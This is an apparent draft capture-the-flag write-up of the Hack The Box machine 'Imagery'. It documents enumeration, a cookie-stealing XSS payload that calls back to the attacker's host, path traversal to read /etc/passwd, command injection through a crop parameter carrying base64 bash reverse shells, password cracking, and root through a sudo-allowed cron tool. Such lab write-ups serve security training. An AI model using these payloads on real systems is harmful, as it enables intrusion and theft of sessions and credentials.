---
slug: /write-up/htb/machines/medium/imagery
pagination_next: null
pagination_prev: null
draft: true
---

## Enumeration

The initial enumeration shows open ports on SSH (22) and some HTTP server on 8000

```shell
┌──(gal㉿gal)-[~]
└─$ nmap 10.10.11.88                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 20:21 CEST
Nmap scan report for 10.10.11.88
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
```

Let's enumerate further the port 8000:

```shell
└─$ nmap 10.10.11.88 -p 8000 -A         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 20:22 CEST
Nmap scan report for 10.10.11.88
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops

TRACEROUTE (using port 8000/tcp)
HOP RTT      ADDRESS
1   62.49 ms 10.10.16.1
2   33.29 ms 10.10.11.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.31 seconds
```

There's a web server implemented by `Werkzeug` which serves an imaging application. Let's enumerate it:

```shell
└─$ ffuf -ic -w /opt/github/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u http://10.10.11.88:8000/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.88:8000/FUZZ
 :: Wordlist         : FUZZ: /opt/github/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 39ms]
images                  [Status: 401, Size: 59, Words: 4, Lines: 2, Duration: 36ms]
register                [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 49ms]
                        [Status: 200, Size: 146960, Words: 49718, Lines: 2779, Duration: 48ms]
logout                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 38ms]
```

The `session` cookie allows us to determine we're dealing with a Flask application. We can decompress (zlib) and decode base64 the cookie and we see:

```shell
>>> import zlib, base64
... 
... data = 'eJyrVkrJLC7ISaz0TFGyUjIwMDa0tDQyVNJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK\
4HIgwbzE3FSgHSA1DhklSXrJ-blKtQAUHC1z'
... decoded = zlib.decompress(base64.urlsafe_b64decode(data + '=='))  # pad with == if needed
... print(decoded.decode())
... 
{"displayId":"00319921","isAdmin":false,"is_impersonating_testuser":false,"is_testuser_account":false,"username":"test@htb.com"}
```

The cookie is signed, so cannot modify it

## Foothold

### XSS on report bugs

There's a functionality to report a bug, which does not seem SQL safe nor XSS safe, we can write arbitrary HTML. Since this bug report is going to be reviewed by an admin, we can write an XSS payload to send the cookie to a server we own:

```html
<img src=x onerror="fetch('http://10.10.16.52:1234/'+document.cookie)"/>
```

### LFI on download logs

Once we get the admin session, we can explore what the admin can do. It turns out, there's some kind of download logs mechanism. Unfortunately, the feature is not well implemented and is vulnerable to LFI:

```shell
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../etc/passwd' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -b 'session=.eJw9jbEOgzAMRP_...' \
  -H 'Referer: http://10.10.11.88:8000/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' \
  --insecure
```

While try to enumerate things using LFI, I discovered this [wordlist](https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/refs/heads/main/wordlists/file_inclusion_linux.txt).

```shell
ffuf -w /tmp/file_inclusion_linux.txt  -u "http://10.10.11.88:8000/admin/get_system_log?log_identifier=FUZZ" -b "session=.eJw9jbEOgzAMRP_..." -mc 200 -fs 0 -o ~/workspace/gal/htb/Machines/Linux/medium/Imagery/lfi2.txt
```

This wordlist contains a reference to the file `/proc/self/cwd/app.py` which shows up in the fuzzing with `fuff`. `/proc/self/cwd` is a special link that points to the current directory of the current process.

### Command injection on crop

Now, the `crop` operation seems vulnerable to command injection:

```python
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

Confirmed with this payload:

```shell
curl 'http://imagery.htb:8000/apply_visual_transform' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -b 'session=.eJxNjTEOgzAMRe_....' \
  -H 'Origin: http://imagery.htb:8000' \
  -H 'Referer: http://imagery.htb:8000/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' \
  --data-raw '{"imageId":"89607c98-57bc-4075-9615-cb7747abcec5","transformType":"crop","params":{"x":1,"y":"1 || id > /tmp/id #","width":98,"height":130}}' \
  --insecure
  ```

  With the LFI vulnerability, we can read the `/tmp/id` file:

  ```shell
  └─$ ./read-file.sh "/tmp/id"                               
uid=1001(web) gid=1001(web) groups=1001(web)
```

Now, we can add a reverse shell:

```shell
curl 'http://imagery.htb:8000/apply_visual_transform' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -b 'session=.eJxNjTEOgzAMRe_iuWKjRZ' \
  -H 'Origin: http://imagery.htb:8000' \
  -H 'Referer: http://imagery.htb:8000/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' \
  --data-raw '{"imageId":"89607c98-57bc-4075-9615-cb7747abcec5","transformType":"crop","params":{"x":1,"y":"x || echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjUyLzQ0NDQgMD4mMQ== | base64 -d | bash   #","width":98,"height":130}}' \
  --insecure
```

We are in as `web` user, now we need lateral movement to `mark`. When trying to ssh as mark, the auth is rejected because it's asking for the private key, so we'll need to retrieve it somehow.

### Lateral movement

Lurking through the server, I found `var/backup`. There is an encrypted backup, we don't know the password but we can exfiltrate the file and run a dictionary attack with [pyAesDecrypt](https://github.com/B4l3rI0n/pyAesDecrypt).

Once the file is decompressed, we can find the hash for the password used by the users `web` and `mark` on the website:

```shell
└─$ hashcat -m 0 logs -a 0 /usr/share/wordlists/rockyou.txt --show
2c65c8d*****:iam******
01c3d2e*****:sup******
```

Even though we have the password, we cannot connect via SSH because the auth is disabled. However, we can leverage the RCE to connect as `web` and later jump to `mark` and use the password to retrieve the user flag.

## Privilege escalation

Enumerating what user `mark` can do, I spotted he can execute `charcol` binary:

```shell
mark@Imagery:/home/web$ sudo -l
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Looks like, this is a handy tool to manage encryption/decryption (most likely the backup is encrypted) with this tool. Reading the docs, it allows to reset the password for the tool and use a "no-password" mode.

Besides that, it allows to setup cron tasks. Since this is run by `root` user, if we set up a reverse shell in a cron task, we'll get a connection to root.

The only thing missing is the format we need to use in this `charcol` shell:

```shell
help
auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>"
```

So, we input our reverse shell with:

```shell
auto add --schedule "* * * * *" --command "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ2LzQ0NDUgMD4mMQ==|base64 -d|bash" --name "hello-root"
```

And we got into `root` user.
